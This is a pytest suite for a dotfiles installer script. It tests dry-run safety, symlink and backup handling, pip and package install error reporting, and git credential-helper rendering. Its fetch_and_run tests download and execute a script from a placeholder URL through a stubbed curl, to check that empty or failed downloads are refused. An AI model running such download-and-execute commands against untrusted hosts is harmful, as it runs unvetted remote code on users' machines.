        # The real .zshrc is neither backed up nor replaced with a symlink.
        assert not (home / ".zshrc").is_symlink()
        assert (home / ".zshrc").read_text(encoding="utf-8") == "keep me\n"
        assert list(home.glob(".dotfiles_backup_*")) == []

    def test_main_dry_run_leaves_home_untouched(self, shell_env):
        # Full flow: detect OS, plan symlinks, skip package/tool installs,
        # plan shell change -- all without writing to HOME.
        home = shell_env.home
        res = run_sourced("main --dry-run", shell_env.env)
        assert res.returncode == 0, res.stderr
        assert list(home.iterdir()) == [], list(home.iterdir())
        assert "Skipping package and tool installation" in res.stdout
        assert "Dry-run complete" in res.stdout

    def test_unstubbed_package_managers_hit_the_backstop(self, shell_env):
        # Regression: a mid-development dry-run gate once let install.sh reach
        # the REAL host `brew` with HOME inside the pytest tmp dir — Homebrew
        # "upgraded" the font cask by relocating the user's real font files
        # into the doomed tmp HOME. The shell_env backstop stubs must
        # intercept system-mutating tools even when a test forgets to stub
        # them. (No RED phase for this one: observing the failure means
        # executing the real package manager and mutating the host.)
        res = run_sourced("OS=macos install_fonts", shell_env.env)
        assert res.returncode == 0, res.stderr
        assert any(c.startswith("brew install --cask") for c in shell_env.calls), (
            "install_fonts must hit the brew backstop stub, never the host brew"
        )

    def test_zsh_secrets_preview_reflects_an_existing_file(self, shell_env):
        # The preview must announce the decision it would make, not just the
        # write -- "would create" on a machine that already has the file is
        # the same misreport the hooks.json preview once carried.
        secrets = shell_env.home / ".zsh_secrets"
        secrets.write_text("export GEMINI_API_KEY=real-key\n", encoding="utf-8")

        env = {**shell_env.env, "DRY_RUN": "1"}
        res = run_sourced("create_symlinks", env)
        assert res.returncode == 0, res.stderr
        assert "[DRY-RUN] would keep existing" in res.stdout
        assert "would create" not in res.stdout
        assert secrets.read_text(encoding="utf-8") == "export GEMINI_API_KEY=real-key\n"

    def test_change_shell_does_not_invoke_chsh(self, shell_env):
        shell_env.stub("zsh")
        shell_env.stub("chsh")
        env = {**shell_env.env, "DRY_RUN": "1", "SHELL": "/bin/bash"}
        res = run_sourced("change_shell", env)
        assert res.returncode == 0, res.stderr
        assert "[DRY-RUN]" in res.stdout
        assert not any(c.startswith("chsh") for c in shell_env.calls)

    def test_dry_run_is_not_the_default(self, shell_env):
        # A plain create_symlinks (no DRY_RUN) still performs the work: the
        # guards must gate on DRY_RUN=1, never fire by default.
        home = shell_env.home
        (home / ".oh-my-zsh").mkdir()
        res = run_sourced("create_symlinks", shell_env.env)
        assert res.returncode == 0, res.stderr
        assert (home / ".zshrc").is_symlink()

    def test_non_numeric_dry_run_is_rejected(self, shell_env):
        """A typo'd DRY_RUN must abort, not silently do the real work.

        All 22 guards spell `[ "$DRY_RUN" -eq 1 ]`, an INTEGER comparison.
        Given `DRY_RUN=true`, `[` fails with "integer expression expected"
        and, because the guard sits in a condition, `set -e` does not fire --
        every one of them falls through to the real branch. The header
        comment invites exactly this ("env-overridable so tests can exercise
        a single function in dry-run"), so the value is user-supplied and a
        non-numeric one is a reachable typo: the run relinks HOME, moves the
        user's real dotfiles into a backup dir and previews nothing, while
        the errors scroll past as noise.
        """
        env = {**shell_env.env, "DRY_RUN": "true"}
        res = run_sourced("create_symlinks", env)
        assert res.returncode != 0, (
            "a non-numeric DRY_RUN was accepted; the guards silently "
            f"fell through to the real branch\n{res.stdout}"
        )
        assert "DRY_RUN" in res.stderr, res.stderr
        assert list(shell_env.home.iterdir()) == [], list(shell_env.home.iterdir())


class TestFetchAndRun:
    """fetch_and_run downloads a remote installer in full before running it, so
    a truncated/empty download can't execute a partial script."""

    def test_runs_downloaded_script_and_cleans_up(self, shell_env):
        shell_env.stub("curl", body=_CURL_WRITES_SCRIPT)
        res = run_sourced("fetch_and_run https://example.test/x.sh bash", shell_env.env)
        assert res.returncode == 0, res.stderr
        assert "RAN tmp=" in res.stdout
        # With no `--`, the script receives no positional args.
        assert "args=[]" in res.stdout
        # The temp file must be removed after the run (no accumulation).
        m = re.search(r"RAN tmp=(\S+) args=", res.stdout)
        assert m, res.stdout
        assert not Path(m.group(1)).exists()

    def test_passes_positional_args_after_separator(self, shell_env):
        # `-- --unattended` must reach the SCRIPT as $1 (Oh My Zsh's flag),
        # not be consumed as an option to the interpreter.
        shell_env.stub("curl", body=_CURL_WRITES_SCRIPT)
        res = run_sourced(
            "fetch_and_run https://example.test/x.sh bash -- --unattended",
            shell_env.env,
        )
        assert res.returncode == 0, res.stderr
        assert "args=[--unattended]" in res.stdout

    def test_interpreter_flags_before_separator_stay_interpreter_side(self, shell_env):
        # Args before `--` are the interpreter's own flags and must land BEFORE
        # the script path (this is how `sudo -E bash` callers work). `sh -x <tmp>`
        # runs the script under xtrace -- an sh option -- so the script still runs
        # (marker on stdout) AND the trace on stderr proves `-x` was applied to
        # sh rather than passed to the script.
        shell_env.stub("curl", body=_CURL_WRITES_SCRIPT)
        res = run_sourced(
            "fetch_and_run https://example.test/x.sh sh -x",
            shell_env.env,
        )
        assert res.returncode == 0, res.stderr
        assert "RAN tmp=" in res.stdout  # script ran
        assert "+ echo" in res.stderr  # xtrace => -x reached sh, not the script

    def test_rejects_empty_download(self, shell_env):
        # A curl that succeeds but writes nothing (empty 200) must be refused,
        # never handed to a (possibly root) shell.
        shell_env.stub("curl")  # default body leaves the -o target empty
        res = run_sourced(
            "fetch_and_run https://example.test/x.sh bash "
            '&& echo OK || echo "FAILED rc=$?"',
            shell_env.env,
        )
        assert "Downloaded empty script" in res.stdout
        assert "FAILED rc=1" in res.stdout
        assert "RAN tmp=" not in res.stdout

    def test_download_failure_returns_nonzero(self, shell_env):
        shell_env.stub("curl", exit_code=1)
        res = run_sourced(
            "fetch_and_run https://example.test/x.sh bash "
            '&& echo OK || echo "FAILED rc=$?"',
            shell_env.env,
        )
        assert "Failed to download" in res.stdout
        assert "FAILED rc=1" in res.stdout


# A pip3 stub that reproduces PEP 668: a plain `--user` install aborts with
# the externally-managed guard, but the same install succeeds once
# `--break-system-packages` is present.
_PIP_PEP668_STUB = r"""
for a in "$@"; do
  if [ "$a" = "--break-system-packages" ]; then
    exit 0
  fi
done
if [ "$1" = "install" ]; then
  echo "error: externally-managed-environment" >&2
  echo "This environment is externally managed" >&2
  exit 1
fi
exit 0
"""

# A pip3 stub whose install always fails for a non-PEP-668 reason (bad package
# / no network), so the retry must NOT trigger and the reason must surface.
_PIP_HARD_FAIL_STUB = r"""
if [ "$1" = "install" ]; then
  echo "ERROR: Could not find a version that satisfies boguspkg" >&2
  echo "ERROR: No matching distribution found for boguspkg" >&2
  exit 1
fi
exit 0
"""


class TestPipInstallUser:
    """pip_install_user survives PEP 668 and surfaces real failures instead
    of the old `pip install --user ... 2>/dev/null` (which both fails on
    externally-managed Python and hides the reason)."""

    def test_plain_user_install_is_not_broken_for_managed_flag(self, shell_env):
        # Happy path: a healthy pip needs no --break-system-packages, and the
        # override must not be applied speculatively (older pip rejects it).
        shell_env.stub("pip3")  # default body: log call, exit 0
        res = run_sourced("pip_install_user pip3 somepkg", shell_env.env)
        assert res.returncode == 0, res.stderr
        assert "pip3 install --user somepkg" in shell_env.calls
        assert not any("--break-system-packages" in c for c in shell_env.calls)
        assert "Failed to install" not in res.stdout

    def test_pep668_triggers_break_system_packages_retry(self, shell_env):
        # externally-managed guard -> retry into the user site with the
        # override, and succeed without warning.
        shell_env.stub("pip3", body=_PIP_PEP668_STUB)
        res = run_sourced("pip_install_user pip3 mypkg", shell_env.env)
        assert res.returncode == 0, res.stderr
        assert any(
            "install --user --break-system-packages mypkg" in c for c in shell_env.calls
        ), shell_env.calls
        assert "externally managed" in res.stdout
        assert "Failed to install" not in res.stdout

    def test_non_pep668_failure_surfaces_reason_and_does_not_retry(self, shell_env):
        # The whole point of dropping `2>/dev/null`: a genuine failure must
        # report pip's reason, and must NOT be retried with the override
        # (there is no externally-managed marker to justify it).
        shell_env.stub("pip3", body=_PIP_HARD_FAIL_STUB)
        res = run_sourced("pip_install_user pip3 boguspkg", shell_env.env)
        assert res.returncode == 0, res.stderr  # non-fatal by contract
        assert "Failed to install boguspkg" in res.stdout
        assert "No matching distribution found for boguspkg" in res.stdout
        assert not any("--break-system-packages" in c for c in shell_env.calls)
        # exactly one install attempt (no retry)
        assert sum(c.startswith("pip3 install") for c in shell_env.calls) == 1

    def test_mcp_deps_install_routes_through_helper_under_pep668(self, shell_env):
        # The real caller (install_mcp_server_deps) must reach the PEP 668
        # recovery: `pip show` reports mcp absent, then the install succeeds
        # only via the override.
        body = 'if [ "$1" = "show" ]; then exit 1; fi\n' + _PIP_PEP668_STUB
        shell_env.stub("pip3", body=body)
        res = run_sourced("install_mcp_server_deps", shell_env.env)
        assert res.returncode == 0, res.stderr
        assert any(
            "install --user --break-system-packages mcp" in c for c in shell_env.calls
        ), shell_env.calls
        assert "Failed to install mcp" not in res.stdout

    def test_source_has_no_stderr_swallowing_user_install(self):
        # Regression guard encoding the actual bug: no raw `pip install --user
        # ... 2>/dev/null` may remain, both --user sites must route through the
        # helper, and the PEP 668 remedy must be present.
        text = INSTALL.read_text(encoding="utf-8")
        assert not re.search(r"install --user.*2>/dev/null", text)
        assert "pip_install_user()" in text
        assert text.count('pip_install_user "$pip_cmd"') == 2
        assert "--break-system-packages" in text
        assert "externally-managed-environment" in text


class TestTryInstall:
    """try_install runs a tool-install command quietly on success but surfaces
    the installer's own error on failure, replacing the repeated
    `<installer> ... 2>/dev/null || print_warning "Failed to install X"`
    pattern across every package manager."""

    def test_success_is_quiet_and_logged(self, shell_env):
        shell_env.stub("faketool")  # default body: log call, exit 0
        res = run_sourced("try_install widget faketool install widget", shell_env.env)
        assert res.returncode == 0, res.stderr
        assert "faketool install widget" in shell_env.calls
        assert "Failed to install" not in res.stdout

    def test_failure_surfaces_the_installers_reason(self, shell_env):
        shell_env.stub(
            "faketool", body='echo "E: could not reach the registry" >&2\nexit 1'
        )
        res = run_sourced("try_install widget faketool install widget", shell_env.env)
        assert res.returncode == 0, res.stderr  # non-fatal by contract
        assert "Failed to install widget" in res.stdout
        assert "could not reach the registry" in res.stdout

    def test_installer_stdout_progress_is_suppressed_on_success(self, shell_env):
        # npm/go/gem progress noise must not leak on the happy path.
        shell_env.stub("faketool", body='echo "downloading 100%"')
        res = run_sourced("try_install widget faketool install widget", shell_env.env)
        assert res.returncode == 0, res.stderr
        assert "downloading 100%" not in res.stdout

    def test_tree_sitter_install_surfaces_npm_failure(self, shell_env):
        # A real caller (install_tree_sitter_cli) must report why npm failed
        # instead of the old bare "Failed to install tree-sitter CLI".
        shell_env.stub("npm", body='echo "npm ERR! 403 Forbidden" >&2\nexit 1')
        res = run_sourced(
            'command_exists() { case "$1" in tree-sitter) return 1 ;; '
            '*) command -v "$1" >/dev/null 2>&1 ;; esac; }; '
            "install_tree_sitter_cli",
            shell_env.env,
        )
        assert res.returncode == 0, res.stderr
        assert "Failed to install tree-sitter CLI" in res.stdout
        assert "403 Forbidden" in res.stdout

    def test_mutating_installs_no_longer_swallow_stderr(self):
        # The sweep: every mutating install routes through try_install; none
        # may keep `2>/dev/null`. Existence probes are deliberately left alone.
        text = INSTALL.read_text(encoding="utf-8")
        assert "try_install()" in text
        swallowing_mutations = [
            r"npm install -g[^\n]*2>/dev/null",
            r"\bgo install\b[^\n]*2>/dev/null",
            r"\bgem install\b[^\n]*2>/dev/null",
            r"\bbrew install\b[^\n]*2>/dev/null",
            r"composer global require[^\n]*2>/dev/null",
            r"scoop install[^\n]*2>/dev/null",
            r"snap install[^\n]*2>/dev/null",
        ]
        for pat in swallowing_mutations:
            assert not re.search(pat, text), f"still swallowing stderr: {pat}"
        # Unified: no package-manager install pairs directly with a
        # print_warning fallback anymore -- they all route through try_install,
        # including the previously line-wrapped nodejs apt install.
        assert not re.search(r"brew install[^\n]*\|\| print_warning", text)
        assert not re.search(r"apt-get install -y [^\n|]*\|\|", text)
        # Probes must still discard output -- they only care about exit status.
        assert re.search(r"brew list [^\n]*&>/dev/null", text)
        assert re.search(r"npm list -g[^\n]*&>/dev/null", text)
        assert re.search(r"show mcp &>/dev/null", text)
        # fetch_and_run bootstraps (uv/pyenv/docker) intentionally keep their
        # own error handling -- they stream stderr for supply-chain visibility
        # and must NOT be captured by try_install.
        assert re.search(r"fetch_and_run https://astral\.sh/uv", text)
        assert text.count("try_install ") >= 30


class TestLinkingThroughASymlinkedParent:
    """A parent that already resolves INTO the checkout must never be written through.

    `ln -s ~/dotfiles/.claude ~/.claude` is a common pre-existing layout.
    `mkdir -p` no-ops on that symlink, so every dest resolved back onto its own
    src: backup_if_real saw a real entry and MOVED the repo's own file into the
    backup dir, and `ln -sf` left a self-referential link in the working tree --
    while printing [SUCCESS]. _link_codex_config went further and wrote the
    rendered hooks.json and a seeded config.toml straight into the checkout.

    Driven against a COPY of the checkout: with the defect present, the test
    would otherwise relocate the real repository's files.
    """

    @staticmethod
    def _scratch_checkout(tmp_path):
        checkout = tmp_path / "checkout"
        checkout.mkdir()
        shutil.copy2(INSTALL, checkout / "install.sh")
        for rel in (".claude", ".codex", ".gemini", ".config/Code"):
            shutil.copytree(
                REPO_ROOT / rel,
                checkout / rel,
                symlinks=True,
                ignore=shutil.ignore_patterns("__pycache__", ".system"),
            )
        # The nvim tree is large and irrelevant here; an empty dir is enough
        # for link_entry to have a source.
        (checkout / ".config/nvim").mkdir()
        return checkout

    @staticmethod
    def _shape(root):
        return {
            str(p.relative_to(root)): (p.is_symlink(), p.is_file(), p.is_dir())
            for p in root.rglob("*")
        }

    # `.config` covers the git identity render: with ~/.config resolving into
    # the checkout, os.gitconfig and the user's real name/email were written
    # into the working tree as untracked files.
    @pytest.mark.parametrize("rel", [".claude", ".codex", ".gemini", ".config"])
    def test_a_config_dir_already_linked_into_the_checkout_is_left_alone(
        self, shell_env, tmp_path, rel
    ):
        checkout = self._scratch_checkout(tmp_path)
        (shell_env.home / rel).symlink_to(checkout / rel)
        before = self._shape(checkout / rel)

        res = subprocess.run(
            ["bash", "-c", f'source "{checkout / "install.sh"}"\ncreate_symlinks'],
            capture_output=True,
            text=True,
            env=shell_env.env,
            timeout=120,
        )

        assert res.returncode == 0, res.stderr
        assert self._shape(checkout / rel) == before, "the checkout was modified"
        assert not list(shell_env.home.glob(f".dotfiles_backup_*/{rel}")), (
            "the repository's own files were moved into the backup dir"
        )
        assert "resolves into the checkout" in res.stdout + res.stderr

    # The guards compared `pwd -P` strings. bash resolves symlinks textually
    # and never canonicalises case, so on a case-insensitive filesystem (the
    # macOS default) a link spelled `.../CHECKOUT/.claude` and an installer run
    # from `.../checkout` produced two different strings for one directory, and
    # every guard above was bypassed. Only meaningful where the FS folds case;
    # a case-sensitive FS cannot express the alias at all.
    @pytest.mark.parametrize("rel", [".claude", ".codex", ".gemini", ".config"])
    def test_a_case_differing_alias_of_the_checkout_is_still_detected(
        self, shell_env, tmp_path, rel
    ):
        checkout = self._scratch_checkout(tmp_path)
        alias = tmp_path / "CHECKOUT"
        if not alias.exists():
            pytest.skip("filesystem is case-sensitive")
        (shell_env.home / rel).symlink_to(alias / rel)
        before = self._shape(checkout / rel)

        res = subprocess.run(
            ["bash", "-c", f'source "{checkout / "install.sh"}"\ncreate_symlinks'],
            capture_output=True,
            text=True,
            env=shell_env.env,
            timeout=120,
        )

        assert res.returncode == 0, res.stderr
        assert self._shape(checkout / rel) == before, "the checkout was modified"
        assert "resolves into the checkout" in res.stdout + res.stderr


class TestDanglingParentSymlinks:
    """A stale symlink where a config directory belongs must be replaced, not fatal.

    `[ "$DRY_RUN" -eq 1 ] || mkdir -p "$HOME/.claude"` is an OR-list, so the
    mkdir IS the command `set -e` watches: on a dangling ~/.claude it failed
    with a bare "No such file or directory" and the installer died mid-run,
    before packages, MCP registration or chsh -- with no [ERROR] line.
    backup_if_real already treats a symlink, even a broken one, as ours to
    replace; the directory sites have to agree.
    """

    @pytest.mark.parametrize(
        "rel", [".claude", ".codex", ".gemini", ".tmux", ".config", ".config/Code/User"]
    )
    def test_a_dangling_symlink_where_a_config_dir_belongs_is_replaced(
        self, shell_env, rel
    ):
        home = shell_env.home
        (home / ".oh-my-zsh").mkdir()
        (home / rel).parent.mkdir(parents=True, exist_ok=True)
        (home / rel).symlink_to("/nonexistent/gone")

        res = run_sourced("create_symlinks", shell_env.env)

        assert res.returncode == 0, res.stderr
        assert (home / rel).is_dir() and not (home / rel).is_symlink()

    def test_a_dangling_themes_symlink_is_replaced_too(self, shell_env):
        home = shell_env.home
        (home / ".oh-my-zsh/custom").mkdir(parents=True)
        (home / ".oh-my-zsh/custom/themes").symlink_to("/nonexistent/gone")

        res = run_sourced("create_symlinks && link_oh_my_zsh_theme", shell_env.env)

        assert res.returncode == 0, res.stderr
        assert (home / ".oh-my-zsh/custom/themes/px-rose-pine.zsh-theme").is_symlink()


class TestBackupsAreAnnounced:
    def test_a_backup_made_after_create_symlinks_still_names_its_location(
        self, shell_env
    ):
        """create_symlinks reports the backup dir only for ITS OWN backups.

        With nothing else to back up it rmdir'd the empty dir and said nothing;
        link_oh_my_zsh_theme (called later from main) then re-created it for
        the user's hand-edited theme and printed only "Backing up existing ...",
        so the one file that was moved was moved to a location never shown.
        """
        home = shell_env.home
        themes = home / ".oh-my-zsh/custom/themes"
        themes.mkdir(parents=True)
        (themes / "px-rose-pine.zsh-theme").write_text(
            "hand-edited\n", encoding="utf-8"
        )

        res = run_sourced("create_symlinks && link_oh_my_zsh_theme", shell_env.env)

        assert res.returncode == 0, res.stderr
        backups = list(home.glob(".dotfiles_backup_*"))
        assert len(backups) == 1
        moved = backups[0] / ".oh-my-zsh/custom/themes/px-rose-pine.zsh-theme"
        assert moved.read_text(encoding="utf-8") == "hand-edited\n"
        assert str(backups[0]) in res.stdout + res.stderr, (
            "the backup location was never announced"
        )


class TestGitIdentityRendering:
    @pytest.mark.parametrize(
        "name", ['Taro "T" Yamada', "Taro #1", "Taro; Yamada", "Taro\\"]
    )
    def test_config_metacharacters_in_the_identity_round_trip(
        self, shell_env, tmp_path, name
    ):
        """The rendered [user] block must read back exactly as it was given.

        A raw printf wrote the values unquoted: `#` and `;` start a comment
        (so `Taro #1` became `Taro`), a `"` was swallowed, and a trailing
        backslash CONTINUED the line -- the name absorbed the email line and
        user.email was left unset, so git refused to commit.
        """
        prior = tmp_path / "prior-gitconfig"
        for key, value in (("user.name", name), ("user.email", "t@example.com")):
            subprocess.run(
                ["git", "config", "--file", str(prior), key, value], check=True
            )
        env = {**shell_env.env, "GIT_CONFIG_GLOBAL": str(prior)}

        res = run_sourced("create_symlinks", env)
        assert res.returncode == 0, res.stderr

        rendered = shell_env.home / ".config/git/user.gitconfig"
        for key, expected in (("user.name", name), ("user.email", "t@example.com")):
            got = subprocess.run(
                ["git", "config", "--file", str(rendered), key],
                capture_output=True,
                text=True,
            )
            assert got.returncode == 0, f"{key} is unreadable: {rendered.read_text()}"
            assert got.stdout.rstrip("\n") == expected


def _git_config_all(path, key):
    """Every value git reads for `key`, in file order (empty resets included)."""
    res = subprocess.run(
        ["git", "config", "--file", str(path), "--get-all", key],
        capture_output=True,
        text=True,
    )
    if res.returncode != 0:
        return []
    return res.stdout.split("\n")[:-1]


class TestGithubCredentialHelper:
    """`gh auth git-credential` may only be wired where gh is installable.

    The tracked .gitconfig hard-coded it for github.com and gist.github.com,
    but install_gh only has an install path for macos and ubuntu. detect_os
    also produces OS=linux (non-Debian) and OS=windows, and install_gh returns
    quietly there -- so git called a `gh` that was never installed on every
    HTTPS operation. That is the same failure the file's own comment says was
    fixed for osxkeychain by moving the OS-dependent helper out of the tracked
    file and into the rendered ~/.config/git/os.gitconfig; the gh block was
    left behind.
    """

    GH_HELPER = "!gh auth git-credential"

    def test_tracked_gitconfig_carries_no_gh_helper(self):
        """The OS-dependent helper must not be hard-coded in a linked file.

        Comment lines are stripped before the check on purpose: .gitconfig
        documents WHY the gh helper moved out, and that rationale necessarily
        quotes the helper string. Matching the raw text would fail on the
        explanation of the very fix it is guarding -- and the natural repair
        would be to delete the explanation.
        """
        text = (REPO_ROOT / ".gitconfig").read_text(encoding="utf-8")
        active = "\n".join(
            line for line in text.splitlines() if not line.lstrip().startswith("#")
        )
        assert self.GH_HELPER not in active, (
            ".gitconfig hard-codes the gh credential helper; it is linked on "
            "every OS, including the ones install_gh cannot install gh on"
        )

    @pytest.mark.parametrize("os_name", ["macos", "ubuntu"])
    def test_rendered_config_wires_gh_where_gh_is_installable(self, shell_env, os_name):
        res = run_sourced(f"OS={os_name} create_symlinks", shell_env.env)
        assert res.returncode == 0, res.stderr
        rendered = shell_env.home / ".config/git/os.gitconfig"
        for host in ("github.com", "gist.github.com"):
            key = f"credential.https://{host}.helper"
            # The empty first value is the reset that drops any helper
            # accumulated before it; dropping it would let a generic helper
            # answer for github.com ahead of gh.
            assert _git_config_all(rendered, key) == ["", self.GH_HELPER], (
                f"{key} in {rendered.read_text(encoding='utf-8')!r}"
            )

    @pytest.mark.parametrize("os_name", ["linux", "windows"])
    def test_rendered_config_omits_gh_where_gh_is_absent(self, shell_env, os_name):
        # gh must be genuinely absent, not merely unsupported: a developer
        # workstation has a real gh on PATH, and finding it is exactly what
        # the sibling test below asserts should wire the helper.
        #
        # Shadowing command_exists rather than stripping PATH, for the reason
        # _without_commands documents: it refuses to remove a protected system
        # directory and stops there. gh sits in /opt/homebrew/bin on this
        # author's Mac (strippable, so the test passed locally) and in
        # /usr/bin on the GitHub ubuntu runner (protected, so gh stayed
        # visible and CI failed on a green local run). The shadow makes the
        # two hosts run the same condition -- which is the point, since the
        # host difference is what let this through review.
        res = run_sourced(
            'command_exists() { case "$1" in gh) return 1 ;; '
            '*) command -v "$1" >/dev/null 2>&1 ;; esac; }; '
            f"OS={os_name} create_symlinks",
            shell_env.env,
        )
        assert res.returncode == 0, res.stderr
        rendered = shell_env.home / ".config/git/os.gitconfig"
        assert self.GH_HELPER not in rendered.read_text(encoding="utf-8"), (
            f"OS={os_name} has no gh install path and no gh on PATH, so git "
            "must not be told to call gh"
        )

    @pytest.mark.parametrize("os_name", ["linux", "windows"])
    def test_rendered_config_wires_gh_when_it_is_already_installed(
        self, shell_env, os_name
    ):
        """An OS install_gh cannot serve may still have gh from elsewhere.

        Arch and Fedora ship gh in their own repositories, and Git Bash users
        get it from winget/scoop; detect_os calls both `linux`/`windows`.
        Gating the credential helper purely on the OS name would take the
        helper away from those users -- who had it unconditionally while the
        block lived in the tracked .gitconfig -- and drop them back to the
        generic cache helper, re-prompting on every HTTPS operation. That is
        a regression introduced by the fix, not by the original bug.
        """
        shell_env.stub("gh")
        res = run_sourced(f"OS={os_name} create_symlinks", shell_env.env)
        assert res.returncode == 0, res.stderr
        rendered = shell_env.home / ".config/git/os.gitconfig"
        assert self.GH_HELPER in rendered.read_text(encoding="utf-8"), (
            f"gh is installed on OS={os_name}, so the helper must be wired"
        )

    def test_generic_helper_still_follows_the_github_block(self, shell_env):
        """Order is behaviour: the reset must not swallow the generic helper.

        In the original .gitconfig the github block came first and the
        generic helper arrived later via [include], so git's helper list for
        a github URL was [gh, <generic>] -- gh first, the OS keychain/cache
        behind it. Emitting the github block after the generic one instead
        would put the `helper =` reset after it and leave [gh] alone.
        """
        res = run_sourced("OS=macos create_symlinks", shell_env.env)
        assert res.returncode == 0, res.stderr
        rendered = shell_env.home / ".config/git/os.gitconfig"
        text = rendered.read_text(encoding="utf-8")
        assert text.index('[credential "https://github.com"]') < text.index(
            "\n[credential]"
        ), text
        assert _git_config_all(rendered, "credential.helper") == ["osxkeychain"], text
